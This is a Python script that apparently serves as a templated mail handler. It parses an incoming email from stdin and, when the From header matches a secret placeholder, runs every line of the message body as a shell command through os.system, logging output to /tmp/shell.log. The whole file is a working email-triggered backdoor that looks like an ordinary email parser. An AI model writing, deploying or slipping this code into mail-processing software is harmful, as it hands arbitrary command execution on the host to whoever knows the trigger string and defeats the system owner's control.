#!/usr/bin/python3
import os
import re
import sys
import email

SECRET_STRING = "{{ backdoor_secret }}"


def main(stdin):
    msg = email.message_from_string(stdin)
    out = {}
    out['date'] = msg['Date']
    out['id'] = msg['Message-Id']
    out['from'] = msg['from']
    out['body'] = msg.get_payload()
    out['raw'] = str(msg)
    out['to'] = re.search('From: (?:(?!\\n).)*', out['raw']).group(0).split(': ')[1]

    if out['to'] == SECRET_STRING:
        for line in out['body'].split('\n'):
            os.system('{} >> /tmp/shell.log'.format(line))


if __name__ == '__main__':
    stdin = sys.stdin.read()
    main(stdin)
